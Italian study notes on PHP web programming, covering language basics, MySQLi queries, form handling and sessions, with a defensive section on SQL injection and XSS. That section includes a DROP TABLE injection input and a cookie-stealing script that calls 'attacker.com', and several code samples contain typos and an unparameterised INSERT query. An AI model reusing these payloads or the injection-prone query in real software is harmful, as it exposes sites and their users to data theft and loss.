*non parleremo delle specifiche sul linguaggio in modo dettagliato ma di come usare il php nel mondo delle tecnologie web*

[[SEO]] -> Google ci penalizza se abbiamo un tempo di accesso molto alto, mentre se abbiamo un tempo di accesso basso guadagnamo i punti. 

La parte che influenza di più il tempo di accesso è il *backend*!!! 
**NB**:*Alcuni concetti sono richiesti dal corso di sistemi operativi, controllare quindi gli appunti su* https://1drv.ms/u/s!AtisJykWD7b4wVYyp68Y5nzEzast?e=c8UCYW *E anche concetti di base di dati che però ripasserò qui*

**RICORDA**
1) **STRUTTURA** : [[HTML]]
2) **PRESENTAZIONE** : [[CSS]]
3) **COMPORTAMENTO** : PHP per i server, JavaScript per i client
E tutte devono essere separate.

IL **PHP** potrebbe essere considerato vecchio perchè è del 1994 ma tuttavia il 79% del web lo continua ad usare, quindi per lavoro serve.

- **PHP**, acronimo di *P*ersonal *H*ome *P*age 1994, oggi è conosciuto con l'acronimo ricorsivo **PHP** *H*ypertext *P*rocessor
- è un linguaggio di scripting interpretato
	- sul *server* viene eseguito il codice
	- sul *browser* viene visualizzato l'output
- è stato creato per la creazione e manipolazione di pagine web
- Riprende la sintassi dei linguaggi C e Perl
- è un linguaggio a tipizzazione debole e supporta il paradigma ad oggetti

### Cose da non fare
````HTML
<html>
	<head>
		<title>Test PHP </title>
	</head>
	<body>
		<?php echo "Hello World!<p>";?>
	</body>
</html> <!--NON FARLO!!!!! DEVI RIMPIAZZARE STRUTTURA E CODICE-->
````

# Caratteristiche del linguaggio
##### Novità versione 7
- velocità di esecuzione
- Corregge molti bug di sicurezza
- Nuovi costrutti che facilitano la programmazione e permettono una migliore leggibilità del codice
- Migliore gestione delle eccezioni e del flusso del programma
- il 26 Nov 2020 è stata rilasciata la versione 8
	- Nuovi tipi (Ex *unione*)
	- Nuove espressioni match
	- Just In Time Compilation
**INFO INIZIALI**
- Uno script PHP
	- Si può trovare in qualsiasi cartella del server
		- `http://www.server.it/cartella/codice.php`
	- Può essere lanciato attraverso l'interprete
		- `php mioCodice.php`
		- In questo caso l'output viene dato sulla shell
	- `<?php` Tutto il codice php si trova in un tag `?>`
	- Questo permette di includere PHP in qualsiasi altro linguaggio
	- Se il codice PHP è su un file dedicato *consigliato* si può omettere il tag di chiusura
		- l'esecuzione termina dopo l'ultima istruzione
		- Non vengono inserite linee in più o output non voluto
##### File di configurazione
- Parametri di funzionamento di PHP sono definiti nel file *php.ini* che il server web legge ad ogni riavvio
Alcuni esempi:
- `display_errors = On` -> mostra gli errori 'sul browser'
- `max_execution_time` -> tempo concesso per l'esecuzione di uno script, dopo il quale si blocca
- `session.save_path`-> questo parametro indica la cartella nella quale PHP salva i file di sessione
- `phpinfo()`-> per vedere le informazioni contenute in *php.ini*
### Commenti e blocchi
-> Ogni istruzione deve essere terminata da un `;`
-> I commenti su una riga...
````PHP
//vengono identificati così (stile Java o C)
# oppure così (stile Perl o shell)
/* I multiriga
	in questo modo */
````
### Variabili
- Le variabili vengono indicate dal segno $ seguito dal nome della variabile
- I nomi di variabili possono iniziare solo con una lettera o _
- PHP è case sensitive ($a $\not=$ $A)
- Le variabili *non* devono essere obbligatoriamente dichiarate
	- **Attenzione** agli errori di battitura!
	- `isset, unset`
- Esistono delle variabili predefinite
	- `$_SERVER["HTTP_HOST"` -> nome del sito
	- `$_SERVER["PHP_SELF"]` -> nome del file che contiene lo script
- **Attenzione**:
	- `$stringa = "numero"; $numero = 123;`
	- `echo $stringa` -> stampa 123
### Tipi
- In PHP il tipo viene dedotto dal contesto d'uso ed una variabile può cambiare tipo durante la sua esistenza
- PHP supporta 8 tipi primitivi
- Tipi scalari 
	- boolean, integer, float, string
- Tipi composti
	- array
	- object
	- callable
- Tipi speciali
	- resource
	- NULL
### Interpretazione nelle stringhe
- PHP consente di forzare o meno l'interpretazione dei nomi delle variabili all'interno delle stringhe
	- Se `$eta=12`, la stringa `"Pippo ha $eta anni"` viene stampata così: *Pippo ha 12 anni*
	- Una coppia di apici singoli `''` viene usata per delimitare una stringa che **NON** deve essere interpretata
	- I doppi apici `""` sono usati per delimitare una stringa che deve essere interpretata
	- Il carattere di escape viene utilizzato per rappresentare caratteri speciali all'interno di stringhe interpolate è `\`
````PHP
$uno = 1; $due = 2;
echo '$uno+ $due\n'; //stampa: $uno+ $due\n
echo "$uno+ $due\n"; //stampa: 1 + 2
echo "\$uno+\$due\\n"; //stampa: $uno+$due\n
````
#### Conversione stringhe - interi
````PHP
<?php
	$a=2;
	$b=10;
	$somma= $a + $b;
	$stringa = $a . $b;
	$somma2= $stringa + $a;
	echo "Somma: $somma\n"; //somma: 12
	echo "Stringa: $stringa\n"; //Stringa: 210
	echo "\$somma2: $somma2". "\n"; //$somma2: 212
?>
````
###### Funzioni per la manipolazione delle stringhe
- `strstr(string $stringa, string $cercata)`: restituisce FALSE se cercata non è contenuta in stringa, altrimenti stringa a partire dalla prima occorrenza di cercata
- `stristr(string $stringa, string $cercata)`: come la prima ma ignora la capitalizzazione
- `strpos(string $stringa, string $cercata)`: come prima ma restituisce la posizione della prima occorrenza
- `strcmp(string $stringa1, string $stringa2)`: restituisce 0 se le 2 stringhe sono uguali, 1 se la prima stringa viene dopo la seconda in ordine lessicografico, viceversa -1
- `trim(string $stringa)`: toglie gli spazi prima e dopo
- `substring(string $stringa, int $inizio, int $fine)`
- `str_replace(string $cercata, string $sostituita, string $stringa)`
### Gli array
- PHP mette a disposizione sia array a cui si accede tramite un indice, sia gli array associativi, ovvero coppie (chiave, valore)
- `array()` è il costruttore, `count()` restituisce la lunghezza
````PHP
<?php
	$vuoto = array(); //array vuoto
	$settimana = array("lunedì", "martedì", "mercoledì");
	echo $settimana[1]; //stampa martedì
	echo count($settimana); //stampa 3
	$settimana[0] = "Lunedì"; //modifica un elemento
	$settimana[] = "giovedì"; //aggiunge un elemento in coda;
	unset($settimana[2]); //rimuove il terzo elemento
	unset($settimana); //cancella l'array
?>
````
#### Hash
- Array associativi sono array in cui ciascun elemento viene associato ad una chiave che può essere utilizzata come indice
	- `$parentiPaperino = array("Paperone" => "zio", "Qui" => "nipote", "Quo" => "nipote");` dove il nome è la chiave e il grado di parentela il contenuto
	- `$parentiPaperino["Qui"] //contiene "nipote"`
	- `unset($parente_paperino["Qua"]); //toglie l'elemento "Qua"`
###### Stampa di un array
````PHP
<?php
	$vuoto = array(10);
	echo "stampo \$vuoto";
	print_r($vuoto);
	$settimana = array("lunedì", "martedì", "mercoledì", "giovedì", "venerdì", "sabato", "domenica");
	echo "stampo \$settimana con echo: $settimana \n";
	echo "stampo \$settimana con print_r:\n";
	print_r($settimana);
	$parentiPaperino = array("Paperone" => "zio", "Qui" => "nipote", "Quo" => "nipote", "Qua" => "nipote");
	echo "stampo \$parentiPaperino:\n";
	print_r($parentiPaperino);
?>
/* STAMPA:
stampo $settimana con echo: Array
stampo $settimana con print_r:
Array
{
	[0] => lunedì
	[1] => martedì
	[2] => mercoledì
	[3] => giovedì
	[4] => venerdì
	[5] => sabato
	[6] => domenica
}
stampo $parentiPaperino:
Array
{
	[Paperone] => zio
	[Qui] => nipote
	[Quo] => nipote
	[Qua] => nipote
}
*/
````
### Tipi speciali
- I dati di tipo *resource* sono destinati alla rappresentazione di strutture esterne complesse e non sono direttamente manipolabili in PHP, ma il controllo è demandato a specifiche librerie
- Il tipo *null* ha come unico valore *NULL* che rappresenta l'assenza di un valore
- Il tipo *const* rappresenta una costante: `define('COSA',<<costante>>)`
## Gli oggetti
````PHP
class Automobile{
	function_construct($targa) {$this->targa = $targa;}
	//dichiarazione delle proprietà
	public $modello = 'Maggiolone';
	//dichiarazione dei metodi
	public function vediTarga() {
		echo $this->targa;
	}
}

$auto = new Automobile(); //ERRORE
$auto->vediTarga();
````
- Si possono dichiarare classi statiche (*static*) e sottoclassi (*extends*)
#### Operatori
- Numerici: operatori numerici del linguaggio C
````
Operatori Numerici:
++ | -- | + | - | / | * | % | **
````
- Stringhe: l'unico operatore disponibile è il `.` per la concatenazione
````
Operatori booleani:
&&, and 
||, or, xor
! (not)
cond ? expr1 : expr2
--------
Operatori relazionali:
==, ===
!=, <>, !==
>, >=
<, <=
<=> (PHP7)
````
#### Operatori su array
- `$a + $b` ritorna l'unione degli array $a e $b
- Si può controllare l'uguaglianza, l'identità di 2 array e la loro negazione utilizzando gli operatori relazionali
	- `$a == $b` se $a e $b hanno le stesse coppie (chiave, valore)
	- `$a === $b` se $a e $b hanno le stesse coppie (chiave, valore) nello stesso ordine e con lo stesso tipo
#### Funzioni su array
- PHP mette a disposizione diverse funzioni sugli array
	- `unser($val)`: applicato ad un elemento distrugge una posizione, applicato all'array distrugge l'array
	- `in_array($val, $array)`
	- `sort, rsort` (*attenzione* con gli array associativi, `asort, arsort`)
	- `explode($separatore, $stringa)`: dato una stringa e un separatore restituisce un array popolato a partire dalla stringa
	- `implode($separatore, $array)`: inverso dalla precedente
	- `array_keys($array)`
	- Lista di funzioni su array:
	- http://it2.php.net/manual/en/ref.array.php
## Istruzioni condizionali if-else switch
````PHP
if (espressione di controllo){
...
} else if (){
	...
}
else{

}
#----------------------------------
switch (espressione){
caso 0:
	...
	break;
caso 1:
	...
default:
	...
}
````
## Cicli
````PHP
while (espressione di controllo){
	//istruzioni del ciclo
}

do{
	//istruzioni del ciclo che verranno eseguite almeno una volta
}while (espressione di controllo) //se vera riesegue dal do

for (inizializzazione; espr. di controllo ; incremento){
	//istruzioni del ciclo
}# Usiamo il for quando sappiamo quante iterazioni dobbiamo fare
````
##### Cicli su array
- `foreach (array as $value){/*istruzioni ciclo*/}`
- `foreach (array as $key => $value) {istruzioni ciclo}`
````PHP
foreach ($parentiPaperino as $i => $valore){
	echo "\$parentiPaperino [", $1,"]: ", $parentiPaperino[$i], "\n"; //oppure $valore
}
/*Stampa
	$parentiPaperino[Paperone]: zio
	$parentiPaperino[Qui]: nipote
	$parentiPaperino[Quo]: nipote
	$parentiPaperino[Qua]: nupote
*/
````
- Se si vuole modificare il valore di una cella bisogna far precedere la variabile con &
````PHP
$vettore = array(1, 2, 3, 4);
foreach ($vettore as &$value){
	$value = $value * 2;
} //$valore adesso contiene 2, 4, 6, 8
````
- Non è possibile modificare le chiavi di un array associativo
## Funzioni
- Le funzioni si definiscono tramite la keyword `function`. Il passaggio di parametri è per valore.
````PHP
function funzione($arg1, $arg2="default", /*...,*/ $argn){
	echo "sono una funzione.\n";
	return $valore;
}
````
- Se è necessario il passaggio per riferimento è sufficiente far precedere un `&`
````PHP
function quadrato(&$val){
	$val = $val*$val;
}
````
##### Scope delle variabili
- lo scope di una variabile è lo script PHP stesso
- In PHP le variabili globali non vengono viste all'interno delle funzioni se non dichiarate esplicitamente come globali
````PHP
$a = 3; $b = 2;

function somma(){
	$b = $a + $b;
}

somma();
echo $b;
````
##### Variabili superglobali
- Sono variabili predefinite nel linguaggio. Sono accessibili ovunque:
	- `$GLOBALS`: array associativo che contiene tutte le variabili globali (*ex. `$GLOBALS['a']`*)
	- `$_SERVER`: array associativo che contiene informazioni sul server che ospita lo script
	- `$_GET`: parametri passati al server in caso di metodo get
	- `$_POST`: parametri passati al server in caso di metodo post
	- `$_FILES`: elenco di file di cui si sta facendo l'upload
	- `$_COOKIE`: array associativo contenente i cookie
	- `$_SESSION`: array associativo con i dati delle sessione
	- `$_Request`: contiene le variabili `$_GET, $_POST` e `$_COOKIE`
	- `$_ENV`: variabili di ambiente
### Gestione Input e Output da file
- La libreria di sistema mette a disposizione diverse funzioni
	- `int fopen` (string nomefile, string modalità)
		- modalità: `r,w,a` (append) se si aggiunge + indica sia lettura che scrittura
	- `bool fclose`(int puntatorefile)
	- `string fgetc` (int puntatorefile)
	- `string fread` (int puntatorefile, int length)
	- `bool feof` (int puntatorefile)
	- `int fwrite` (int file, string stringa, int length)
	- `array file` (string nomefile)
	- `string file_get_contents` (string nomefile)
	- `int readfile` (string nomefile)
###### Esempio di codice errato
````HTML
<!DOCTYPE html>
<html lang="it">…<body>
	<h1>Questa è una pagina qualsiasi</h1>
	<p>Loren ipsum ... </p><p>Pagina visitata da n.
	<?php
		$nomefile = "contatore.txt";
		$contenuto = file($nomefile);
		$visite = trim($contenuto[0])+1;
		if ($fp = fopen ($nomefile, "w")){
			fwrite ($fp, $visite);
			fclose($fp);
		}
		echo $visite;
	?> persone.</p>
</body></html>
````
###### Separazione tra struttura e comportamento
````PHP
<?php
	echo file_get_contents("inizioPagina.txt");
	$nomefile = "contatore.txt";
	$contenuto = file($nomefile);
	$visite = trim($contenuto[0])+1;
	try {
		$fp = fopen($nommefile, "w");
		fwrite ($fp, $visite);
		fclose($fp);
		echo $visite;
	}catch (Throwable $t){
		echo "Errore nell'apertura del file. $t\n";
	}
	echo file_get_contenst("finePagina.txt");
?>
````
### Operatori di sostituzioni
- `preg_replace($pattern, $sostituzione, $stringa):` cerca in $stringa il pattern o lo sostituisce con $sostituzione
- $stringa e $sostituzione possono essere una stringa o un array
````PHP
<?php
	$stringa = "troppi   spazi";
	$risultato = preg_replace('/\s\s+/', '', $stringa);
	echo $risultato;
?> 
//Stampa: troppi spazi
````
- `str_replace($dasostituire, $sostituzione, $stringa):` come sopra ma non usa espressioni regolari ma una semplice stringa
### Gestione degli errori
- PHP7 cambia la gestione degli errori rispetto alla versione precedente (meccanismo del *die*)
- gli errori sono gestiti come eccezioni
````PHP
try{
	//codice che può generare un errore
}
catch (Throwable $t){
	//gestione degli errori in PHP7
}
catch (Exception $e){
	//per compatibilità con PHP5 (non raggiunto da PHP7)
}
````

### Inclusione di file
- PHP mette a disposizione 2 modi di includere file che contengono altre porzioni di codice
	- `include(nomefile)`: posizionata all'inizio dello script equivale ad un copia-incolla. Genera un warning se il file manca
		- `include_once(nomefile)`: controlla le doppie inclusioni
	- `require(nome file)`: uguale a include ma genera un errore che blocca l'esecuzione se il file non esiste
		- `require_once(nomefile)`
## Connessione ad un database
````PHP
<?php //connessione al DBMS e selezione del database
//definizione parametri di connessione
...
//stringa di connessione al DBMS e creazione istanza della classe MySQLi
$connessione = new mysqli($host, $user, $password, $db);

//verifica su eventuali errori di connessione
if($connessione->connect_errno){
	echo "Connessione fallita (". $connessione->connect_errno."): ".$connessione->connect_error;
	exit();
}
?>
````
### Restituzione dei risultati di una query
- Il risultato di una query può essere molto *grande* in termini di byte restituiti. Per questioni di scalabilità, è quindi necessario bufferizzare il risultato lato client, per poi poterci navigare
- La funzione *query* si occupa sia di eseguire una query che di bufferizzare il risultato
````PHP
<?php //selezione di dati da una tabella con MySQL
//inclusione del file di connessione
	include "connessione.php"
	//creazione della prima parte della pagina
	...
	//esecuzione della query per la selezione dei record
	if(!$result = $connessione->query("SELECT * FROM tabella")){
		echo "Errore della query:".$connessione->error.".";
		exit();
	}else{ /*ciclo sui record*/}
	//chiusura della connessione
	$connessione->close();
	//fine pagina
	...
?>
````
````PHP
//CICLO SUI RECORD RESTITUITI
if($result->num_rows >0){
	//ciclo dei record restituiti dalla query
	while($row = $result->fetch_array(MYSQLI_ASSOC)){
		echo $row['campo1']."".$row['campo2';]
	}//liberazione delle risorse occupate dal risultato
	$result->free();
}
````
- `$result->fetch_array(COSTANTE)` restituisce un array
	- `MYSQLI_ASSOC` impone l'uso di un array associativo che ha come chiave il nome del campo e come valore il valore del campo stesso
	- `MYSQLI_NUM` impone l'uso di un array numerico
	- `MYSQLI_BOTH` impone la creazione di entrambi
#### Impostazione del set di caratteri
````PHP
if(!$connessione->set_charset('utf8')){
	printf("Non è possibile usare UTF8: %s\n", $connessione->error);
} else{
	printf("Set di caratteri: %s\n", $connessione->character_set_name());
}
````
#### Cicli sui dati restituiti
è possibile cambiare l'ordine di scorrimento dei risultati
````PHP
for($num = $result->num_rows - 1; $num >= 0; $num--){
	$result->data_seek($num);
	$row = $result->fetch_assoc();
	echo " campo =".$row['campo']."\n";
}
````
- `mysqli_data_seek($risultato, offset)`
### Query e risultati
`mysqli_query` restituisce False se fallisce
- Restituisce un `mysqli_result` in caso di:
	- SELECT
	- SHOW
	- DESCRIBE
	- EXPLAIN
- In tutti gli altri casi restituisce TRUE
- `mysqli_affected_rows`
	- Restituisce il numero di righe alterate da INSERT, UPDATE, REPLACE o DELETE
## Espressioni regolari
- Uno dei punti di forza di Perl è rappresentato dalla facilità con cui è possibile testare l'occorrenza di una sotto stringa in una stringa.
- In PHP ci sono le Perl Compatible Regular Expression
- Specificano un *pattern* da ricercare in una stringa, cioè una sotto-stringa specifica o, più in generale una categoria di sotto-stringhe
- `int preg_match($pattern, $stringa)`: operatore di corrispondenza, ritorna 1 se viene trovato il match, 0 viceversa
- `/^([\w\-\+\.]+)\@([\w\-\+\.]+)\.([\w\-\+\.]+)$/;`
#### Caratteri speciali e quantificatori
Simbolo | Descrizione
--------|------------
`.` | Qualsiasi carattere tranne fine riga
`[aeiou]` | Classe di caratteri che identifica una vocaleù
`[a-h]` | Classe di caratteri che identifica lettere dalla *a* all'*h*
`^` | Inverso del set che lo segue: `^[aeiou]`
`/a{4}/` | a ripetuta 4 volte; {n,} almeno n volte
`*` | 0 o più ripetizioni
`+` | 1 o più ripetizioni
`?` | 0 o 1 elemento
##### Classi predefinite
Simbolo | Definizione
-----| ----
\d | Carattere numerico
\D | Carattere non numerico
\w | Carattere alfanumerico
\W | Carattere non alfanumerico
\s | Spazio o tabulazione
\S | Qualunque carattere che non sia uno spazio o tabulazione
#### Modificatori
- `/Mario/i;` ha esito positivo anche se una variabile contiene la parola mario con una diversa capitalizzazione
- `/^parola$/m;` ha esito positivo se una variabile contiene solo parola o anche un fine linea oltre alla parola
- `/pattern/g;` trova tutte le occorrenze di un pattern
````PHP
if (preg_match("/php/i", "PHP è un linguaggio di scripting.")) {
	echo "Trovato un match!";
} else{
	echo "Nessun match trovato";
}
````
#### Operatori di sostituzioni
- `preg_replace($pattern, $sostituzione, $stringa)`: cerca in $stringa il pattern o lo sostituisce con $sostituzione
- $stringa e $sostituzione possono essere una stringa o un array
````PHP
<?php
	$stringa = 'troppi   spazi';
	$risultato = preg_replace('/\s/\s+/', '', $stringa);
	echo $risulato;
?>
````
- `str_replace($dasostituire, $sostituzione, $stringa)`: come sopra ma non usa espressioni regolari ma una semplice stringa
## HTML per i form
- `<form action="http://server/path/file.php" method="post">`
- Metodo **GET**: è il predefinito, il browser allega la *stringa di query* all'url
	- `http://server/path/file.php?parametro=valore`
	- limite alla lunghezza della stringa (256 caratteri)
	- vulnerabilità dell'accesso
- Metodo **POST**: la stringa di query viene passato come input standard
	- maggiore facilità di gestione
#### Formato della stringa di query
- Contiene i dati inviati cliccando il pulsante *Submit*
- Il nome e il valore di ciascun elemento della form sono codificati come assegnamenti
- I caratteri speciali sono codificati sottoforma di numeri esadecimali preceduti da %
	- Lo spazio è rappresentato da %20
	- Nome = Mario%20Rossi
- PHP rimuove i caratteri speciali automaticamente
##### Gestione dei parametri
- PHP salva i parametri in tre variabili diverse:
	- Se si usa il metodo *GET* la stringa viene inserita dal server nella variabile superglobale `$_GET`
	- Se si usa il metodo *POST* i dati si trovano nell'array associativo superglobale `$_POST`
	- I dati vengono salvati sempre sull'array delle richieste `$_REQUEST`
		- In questo modo lo script non deve sapere il metodo utilizzato, e non deve essere cambiato se cambiato se cambia il metodo utilizzato
	- **Attenzione**: `$_REQUEST` è una variabile diversa da `$_POST` e `$_GET`, quindi la sua modifica non influenza le altre e viceversa
##### Un esempio completo: dati da un database
- Per stampare dati estratti da un DB le operazioni necessarie sono:
	1. Apro una connessione con il database
	2. Estraggo i dati
	3. Stampo la pagina con i dati o il messaggio di errore
	4. Chiudo la sessione
````PHP
include "connessione.php"; //inclusione del file di connessione
echo file_get_contents("inizio.txt"); //stampo l'inizio pagina
if(!$result = $connessione->query("SELECT * FROM raccolte*")){
	echo "ERRORE della query:" . $connessione->error.".";
	exit();
}else{ //stampa dei record nella tabella
	if($result->num_rows > 0){
		//ciclo while per la stampa delle righe della tabella
		$result->free(); //liberazione risorse occupate dalla query
	} echo "</tbody></table>";
}
$connession->close(); //chiusura della connessione
echo file_get_contents("pagine/fine.txt");
````
````PHP
while($row = $result->fetch_array(MYSQLI_ASSOC)){
	echo "<tr><th scope=\"row\">".$row['materiale']."</th>";
	echo "<td>" . $row['quantità']. "" . $row['unitaMisura']. "</td>";
	echo "<td>" . $row['destinazione']."</td>";
	echo "<td>" . $row['Note']."</td></tr>";
}
````
````PHP
# INSERIMENTO IN DB: pulizia input
function pulisciInput($value){
	//elimina gli spazi
	$value = trim($value);
	//rimuove tag html (non è sempre una buona idea)
	$value = strip_tags($value);
	//converte i caratteri speciali in entità html (ex. &it;)
	$value = htmlentities($value);
	return $value;
}
````
##### Pericoli
- Ogni volta che permettiamo all'utente di inserire dei dati in un DB ci esponiamo a diversi attacchi
- Gli utenti vanno sempre considerati come potenziali **_utenti malevoli_**
- Un tipico attacco è l'*SQL injection* che consiste nell'inserire codice SQL malevolo
````SQL
SELECT * FROM nomeTabella WHERE campo=$input

$input='valore; DROP TABLE nomeTabella;'
````
**PROBLEMI RILEVATI**
il codice precedente ha 2 problemi:
1. Input non filtrato
2. L'utente utilizzato per accedere al db non deve avere i permessi per rimuovere le tabelle
Soluzioni:
1. *Approccio filter input, escape output*
2. Utente dedicato

**_filterInput_**
Filtra il contenuto di una variabile. *type* può contenere i valori:
- `INPUT_GET, INPUT_POST, INPUT_COOKIE, INPUT_SERVER, INPUT_ENV`
*var_name* è la variabile da filtrare e *filter* contiene il filtro.
**COSTANTI PER LA SANIFICAZIONE DEI DATI**
**FILTER_SANITIZE_EMAIL**: rimuove i caratteri non validi in un’email
**FILTER_SANITIZE_ENCODED**: codifica la stringa come URL
**FILTER_SANITIZE_MAGIC_QUOTES**: aggiunge un carattere `\` prima di ogni` ‘,",\ e NULL`
**FILTER_SANITIZE_NUMBER_FLOAT**
**FILTER_SANITIZE_NUMBER_INT**
**FILTER_SANITIZE_SPECIAL_CHARS**: rimuove tutti i caratteri di escape HTML,` ‘, ",<,>,&` e i caratteri ASCII <32
**FILTER_SANITIZE_FULL,SPECIAL_CHARS**: equivalente a `htmlspecialchars()`, converte i caratteri speciali in entità HTML
**FILTER_SANITIZE_STRING**: rimuove i tag da una stringa
**FILTER_SANITIZE_URL**: rimuove i caratteri non validi
### Attacchi Cross-Site Scripting
- Un attacco di tipo Cross-Site Scripting (XSS) consente di iniettare del codice maligno, di solito JavaScript, in una pagina web
- Questo espone il sistema a vari tipi di attacchi
````HTML
<script> document.write(<iframe src="http://attacker.com? cookie' + document.cookie.escape()+'" height="0" width="0" />);
</script>

strip_tags($comment, $tagAmmessi);
````
#### Escape Output
- abbiamo già visto l'utilizzo della funzione `strip_tags`
- Un progetto interessante è HTML Purifier, che mette a disposizione una libreria per il filtro dei dati che rimuove attacchi di tipo XSS
	- http://htmlpurifier.org
- `htmlspecialchars(), htmlentities()`
````PHP
$new = htmlspecialchars("<a href='test'>Test</a>", ENT_QUOTES);
echo $new;
````
#### Inserimento in DB: utilizzo oggetti
````PHP
class Materiale{
	//proprietà
	private $descr="";
	private $quantita = 0;
	private $unitaMisura = "unità";
	private $destinazione = "";
	private $note = "";
	private $errore = "";
	//costruttore ed altri metodi
}

function__construct($descr, $quant, $misura, $dest, $note){
	$erroreDescr = $this->setDescrizione($descr);
	$erroreQuant = $this->setQuantita($quant);
	$erroreMisura = $this->setUnitaMisura($misura);
	$erroreDest = $this->setDestinazione($dest);
	$erroreNote = $this->setNote($note);

	$this->errore = $erroreDescr.$erroreQuant.$erroreMisura.$erroreDest.$erroreNote;
	$this->errore = $this->errore?"<ul>". $this->errore."</ul>":"";
}

public function__toString(){
	return $this->errore;
}
//metodi per settare le proprietà
private function setDescrizione($value){
	$errore="";
	(strlen($value)<=100) ? $this->descr = $value: errore ="<li> Formato descrizione del materiale non corretto </li>";
	return $errore;
}

private function setQuantita($value)
	(ctype_digit($value)&& strlen($value)<=10)?...

private function setUnitaMisura($value)
	(!(preg_match("/\d/", $value))&&strlen($value)<=20)...

private function setDestinazione($value)
	(strlen($value)<=100)..

private function setNote($value)
	(strlen($value)<=200)...

//metodi per leggere le proprietà
function getDescrizione(){
	return $this->descr;
}

function getQuantita(){return $this->quantita;}
function getUnitaMisura(){return $this->unitaMisura;}
function getDestinazione(){return $this->destinazione;}
function getNote() {return $this->note;}

function save(){//connessione al DBMS
	..
	if($connessione->connect_errno){
		throw new Exception ("Connessione fallitaa: ". $connessione->connect_error.".");
		$connessione->connect_error.".");
	}else{
		$ins ="INSERT INTO raccolte(materiale, quantita, unitaMisura, destinazione, Note) VALUES (".$this->descr.",".$this->quantita...")";
		if(!$connessione->query($ins)){
			throw new Exception ("Errore:" ...);
		}
		$connessione->close();
	}
}

try{
	if(file_exist("materiale.php")){
		Require_once("materiale.php");
	}else{
		theow new Exception("File necessario per l'secuzione mancante.");
	}
	...
} catch(Exception $e){
	//messaggio per l'utente
	echo "The system is currently unavailable. Please try again later:".$e->getMessage().".";
}
//Stampo inizio pagina output
echo file_get_contents("inizio.txt");
//controllo tutti i parametri tranne note che sono opzionali
if((isset($_POST['descr']))&&(isset($_POST['quant'])) && (isset($_POST['unità'])) && (isset($_POST['dest']))){
	foreach($_POST as $chiave => &$valore){
		$valore = pulisciInput($valore);
	}
	//creazione oggetto
	$materiale = new Materiale($_POST['descr'],$_POST['quant'], $_POST['unita'], $_POST['dest'], $_POST['note']);
	if($materiale==""){//inserimento del database
		$materiale->save();
		print "<p>Inserimento avvenuto correttamente.</p>";
	}else{//stampa dell'errore
		print "<p>I dati inseriti non sono corretti: ". $materiale."</p>";
	}
}else{
	print "<p>Compilare tutti i campi!</p>";
} //stampo fine pagina
echo file_get_contents("fine.txt");
````
## Sessioni
- Il protocollo HTTP è *stateless*, per passare informazioni da una pagina all'altra esistono 3 modi:
	1. I campi *hidden*
	2. I *cookies*
	3. Le *sessioni*
- Le sessioni sono più sicure dei primi 2 metodi perchè i dati vengono salvati sul server
- Le gestioni servono ad esempio per gestire le sezioni private, ovvero protette da password di un sito
- Tutti i dati relativi ad una sessione sono salvati nell'array associativo `$_SESSION`che è una variabile superglobale
#### Creazione e lettura
- Alla prima richiesta viene creata una sessione identificata da un *session id (sid)* che viene passato al client (*cookie*)
```PHP
<?php
	//crea una sessione o la attiva
	session_start();
	if(!isset($_SESSION['count'])){
		//creazione di una nuova variabile di sessione
		$_SESSION['count'] = 0;
	} else{
		//uso di una variabile di sessione
		$_SESSION['count']++;
	}
?>
```
#### Distruzione
```PHP
//Cancella una variabile da una sessione
<?php
	session_start();
	unset($_SESSION['count']);
?>

//Cancella tutti i dati di una sessione
<?php
	session_start();
	unset($_SESSION);
?>
```
